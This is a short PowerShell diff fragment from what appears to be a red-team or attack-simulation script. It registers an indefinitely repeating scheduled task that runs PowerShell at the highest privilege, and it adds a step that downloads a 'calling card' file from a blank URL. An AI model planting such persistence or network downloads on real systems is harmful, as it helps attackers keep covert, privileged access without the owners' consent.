@@ -16,3 +16,8 @@ $action = New-ScheduledTaskAction –Execute "$pshome\powershell.exe" -Argument 
 $duration = ([timeSpan]::maxvalue)
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration
 Register-ScheduledTask -TaskName $jobname -Action $action -Trigger $trigger -RunLevel Highest -User $username -Password $password -Settings $settings
+
+# Download and place calling card
+$cardurl = ""
+$carddest = ""
+(New-Object System.Net.WebClient).DownloadFile($cardurl, $carddest)
